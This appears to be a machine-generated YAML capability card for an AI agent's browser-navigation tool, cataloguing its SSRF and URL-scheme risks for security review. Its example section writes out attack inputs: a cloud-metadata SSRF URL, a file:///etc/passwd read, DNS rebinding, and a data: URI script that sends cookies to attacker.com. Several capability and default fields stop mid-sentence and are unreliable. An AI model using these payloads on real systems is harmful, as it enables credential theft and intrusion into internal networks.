# camofox_navigate(url, task_id)

```yaml
schema_version: sink-capability-card/v2
card_id: SCC-2e1ad975e8c46daa
api: camofox_navigate(url, task_id)
api_family: camofox_navigate
runtime:
  language: python
  ecosystem: project-source
  package: camofox_navigate
  version: legacy-source-bound
capability_class: browser-navigation
normative_authority: capability-facts-only
bound_sinks:
- camofox_navigate(url, task_id)
roles:
- role_id: destination-url
  description: Legacy controlled role destination-url.
  bindings:
  - expression: url
    caller_bindable: true
facets:
- facet_id: legacy-facet-03f32c10
  capability: Navigate a real Firefox-fork browser (Camoufox) to any attacker-controlled URL by
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-a8bba5ea
  capability: Load arbitrary HTTP/HTTPS URLs including internal/private-network hosts (e.g.
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-78abb110
  capability: Load loopback URLs (127.0.0.0/8, ::1, localhost) that target services running on the
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-d7fef7d1
  capability: Load file:// URLs — the browser reads and renders local files from the Camofox
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-b2500cf4
  capability: 'Load data: URIs — inline HTML/JS payloads execute in the browser context without'
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-b0bb1517
  capability: 'Load javascript: URIs — execute arbitrary JavaScript in the context of the current'
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-7f7f6232
  capability: 'Load about: URIs — access browser-internal pages and configuration (about:config,'
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-09b5d2ca
  capability: 'Load blob: URIs — render binary content from in-memory blobs.'
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-fac4d255
  capability: 'Load view-source: URIs — read page source of any reachable URL.'
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-686d7afb
  capability: Follow HTTP redirects transparently (requests.Session at the Camofox REST server
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-244b4647
  capability: Execute any JavaScript embedded in the loaded page (the browser runs a full JS
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-bd5f1f91
  capability: Set and read cookies in the browser session (persistent when managed_persistence is
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-57611e0c
  capability: Access browser Web APIs (fetch, WebSocket, WebRTC, Service Workers, etc.) from the
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-02f67522
  capability: DNS resolution happens at the Camofox host at navigation time, enabling DNS
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-31204a3d
  capability: When a tab already exists for the session, navigate it away from its current page
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
library_guarantees: []
defaults:
- default_id: legacy-default-695f7757
  role_id: null
  value: By default the URL passes through `_rewrite_loopback_url_for_camofox` unchanged
  security_effect: By default the URL passes through `_rewrite_loopback_url_for_camofox` unchanged
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-cfbac8a3
  role_id: null
  value: The Camofox server URL (`CAMOFOX_URL`) is resolved from the environment; if unset,
  security_effect: The Camofox server URL (`CAMOFOX_URL`) is resolved from the environment; if unset,
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-2201e559
  role_id: null
  value: The `requests.post` and `requests.get` calls use `timeout` (30s default) but do not
  security_effect: The `requests.post` and `requests.get` calls use `timeout` (30s default) but do not
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-b9e65bf7
  role_id: null
  value: The function auto-takes an accessibility snapshot of the loaded page and returns it
  security_effect: The function auto-takes an accessibility snapshot of the loaded page and returns it
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-41f6c2a4
  role_id: null
  value: Browser sessions are shared across `task_id` — navigating with the same `task_id`
  security_effect: Browser sessions are shared across `task_id` — navigating with the same `task_id`
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
example_usage:
  benign: '# Navigate Camofox to a public web page

    result = camofox_navigate("https://example.com", task_id="research-1")

    # Browser loads example.com; snapshot is returned

    '
  capability_edge: '# Navigate to internal/private network — SSRF via browser

    camofox_navigate("http://169.254.169.254/latest/meta-data/", task_id="ssrf-1")


    # Navigate to loopback (unmodified by default) — hit services on Camofox host

    camofox_navigate("http://127.0.0.1:6379/", task_id="ssrf-2")


    # file:// read local files on the Camofox host

    camofox_navigate("file:///etc/passwd", task_id="fs-1")


    # data: URI — inline JS execution in browser

    camofox_navigate("data:text/html,<script>fetch(''http://attacker.com/?c=''+document.cookie)</script>", task_id="xss-1")


    # DNS rebinding — hostname resolves to internal IP at navigation time

    camofox_navigate("http://7f000001.nip.io:8080/admin", task_id="dns-1")


    # Navigate existing tab away from current page to attacker URL

    camofox_navigate("http://192.168.1.1/admin", task_id="research-1")

    '
provenance:
- /root/project/xclaw-project/hermes-agent/tools/browser_camofox.py:423-488 — camofox_navigate function body
- /root/project/xclaw-project/hermes-agent/tools/browser_camofox.py:338-356 — _ensure_tab POSTs URL to Camofox /tabs endpoint
- /root/project/xclaw-project/hermes-agent/tools/browser_camofox.py:434-438 — existing tab navigated via POST /tabs/{tab_id}/navigate
- /root/project/xclaw-project/hermes-agent/tools/browser_camofox.py:208-246 — _rewrite_loopback_url_for_camofox only rewrites when CAMOFOX_REWRITE_LOOPBACK_URLS is explicitly enabled
- '/root/project/xclaw-project/hermes-agent/tools/browser_camofox.py:1-24 — module docstring: Camofox wraps Camoufox, a Firefox fork with C++ fingerprint spoofing'
- OWASP SSRF cheat sheet — internal IP ranges, cloud metadata endpoints, DNS rebinding
- 'URL scheme abuse reference — file:// data: about: javascript: blob: view-source: schemes'
```
